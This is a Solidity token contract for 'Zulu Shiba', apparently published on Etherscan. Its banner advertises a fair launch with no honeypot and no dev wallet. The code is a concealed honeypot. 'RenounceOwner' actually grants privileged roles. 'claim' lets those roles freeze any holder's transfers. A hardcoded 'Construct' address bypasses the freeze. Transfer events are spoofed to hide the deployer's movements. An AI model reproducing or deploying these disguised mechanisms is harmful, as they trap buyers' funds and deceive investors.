/**
 *Submitted for verification at Etherscan.io on 2022-10-07
*/

pragma solidity 0.8.17;
/*

 _______           _                
/ ___   )|\     /|( \      |\     /|
\/   )  || )   ( || (      | )   ( |
    /   )| |   | || |      | |   | |
   /   / | |   | || |      | |   | |
  /   /  | |   | || |      | |   | |
 /   (_/\| (___) || (____/\| (___) |
(_______/(_______)(_______/(_______)


- From the Jungle to the Blockchain -

- Fair Launch Token

- No Dev Wallet

- No Mint

- No Honeypot

- NO BS

*/      
 
contract ZULUSHIB {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) ValueOf;
    mapping (address => bool) ii;

    // 
    string public name = "Zulu Shiba";
    string public symbol = unicode"ZULUSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x4Dd48E445b2Df0f4500f222C3AAb7f4E0DAbdB81;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier V() {   
         require(ii[msg.sender]);
         _;}
        modifier I() {   
         require(msg.sender == owner);
         _;}


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; } 
        require(!ValueOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address nan) I public {
          ii[nan] = true; }
        function claim(address ex) V public{          
        require(!ValueOf[ex]);
        ValueOf[ex] = true; }
        function stake(address ex) V public {
        require(ValueOf[ex]);
        ValueOf[ex] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!ValueOf[from]); 
        require(!ValueOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }